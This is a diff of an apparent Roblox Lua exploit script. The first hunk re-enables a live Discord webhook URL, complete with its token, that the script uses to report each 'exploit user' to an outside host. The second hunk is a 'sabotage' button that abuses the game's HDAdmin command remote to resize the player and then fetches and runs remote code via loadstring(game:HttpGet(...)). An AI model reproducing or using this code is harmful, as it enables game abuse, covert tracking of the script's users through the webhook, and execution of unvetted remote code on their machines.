@@ -10,7 +10,7 @@ local webhookcheck =
     "Random Exploit User"
     timestamp = DateTime.now():ToIsoDate()
     local url =
-    "https://discord.com/api/webhooks/1010877755975553024/4B3YJTPhCW-0lL_EHyxu7bo_rDv01AI9B_uiyeJ7DcRCN7q7L1SmqCYcQ6dwxKw40GCl-------------"
+    "https://discord.com/api/webhooks/1010877755975553024/4B3YJTPhCW-0lL_EHyxu7bo_rDv01AI9B_uiyeJ7DcRCN7q7L1SmqCYcQ6dwxKw40GCl"
     local data = {
     ["content"] = "",
     ["embeds"] = {
@@ -806,15 +806,15 @@ Tab1:Button("V1 تخريب" ,function()
 	local args = {
 		[1] = ";hat me 7436333515"
 	}
-	
+
 	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-	
+	wait(2)
 	local args = {
-		[1] = ";size me 3"
+		[1] = ";size me 4"
 	}
 	
 	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-
+	wait(2)
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/hat%20%2B%20head%20resize'))()
 
 	end)
